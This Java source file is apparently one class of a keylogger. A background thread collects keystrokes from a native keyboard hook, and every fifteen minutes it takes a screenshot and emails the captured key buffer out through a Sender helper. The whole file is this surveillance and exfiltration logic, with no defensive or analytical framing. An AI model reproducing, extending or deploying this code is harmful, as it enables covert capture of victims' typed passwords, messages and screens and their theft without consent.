package handlers;

import NaiveKeyBoard.NativeKeyboard;

public class ManageService implements Runnable{

	private NativeKeyboard keyboard;
	private Thread service;
	
	
	public ManageService() {
		
		keyboard = new NativeKeyboard();
		
		service = new Thread(this, "Manage Service");
		service.start();
		
	}
	
	public NativeKeyboard getkeyboard() {
		return keyboard;
	}

	@Override
	public void run() {
		long start = System.nanoTime();
		while(true) {
			long elapsed = (System.nanoTime() - start) / 1000000;
			if(elapsed > 60000 * 15) {
				try {
					AdditionalFunctionsIDOntBotherToCreateTheirOwnClasses.MakeScreenshot();
					Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
					keyboard.onSend();
					System.out.println("Send");
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					keyboard.onFail();
				}
				
				start = System.nanoTime();
			}
		}
		
	}
}
